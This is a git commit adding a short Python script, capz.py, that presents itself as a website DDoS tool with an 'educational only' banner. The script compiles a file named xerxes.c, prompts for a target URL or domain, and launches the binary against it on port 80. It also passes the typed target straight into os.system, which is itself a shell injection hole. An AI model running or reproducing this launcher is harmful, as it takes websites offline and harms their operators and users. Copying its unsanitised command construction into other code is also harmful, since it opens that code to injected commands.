8165eeee88ed4e2bfad1f92e3329648bfa641ec5
AndreiValenzuela <87692245+AndreiValenzuela@users.noreply.github.com>
2021-07-30 19:53:47 +0800

    Add files via upload

---
+++ capz.py
@@ -0,0 +1,14 @@
+import os
+os.system("clear")
+print("""
+ DDOS CREATED BY: CAPZZZ
+ RECODED BY: ANDREI VALENZUELA
+ 
+ WARNING: DDOS SCRIPT IS ONLY FOR EDUCATIONAL ONLY PLEASE USE IT AT YOUR OWN RISK
+ THIS DDOS ATTACK IS POWERFULL JUST FOR WEBSITES 
+ PLEASE BE PATIENT
+""")  
+os.system("chmod +x xerxes.c")
+os.system("gcc xerxes.c -o xerxes")
+a = input("\n Enter Your Target Attack Here \n URL/WEBSITE/DOMAIN : ")
+os.system("./xerxes "+a+" 80")
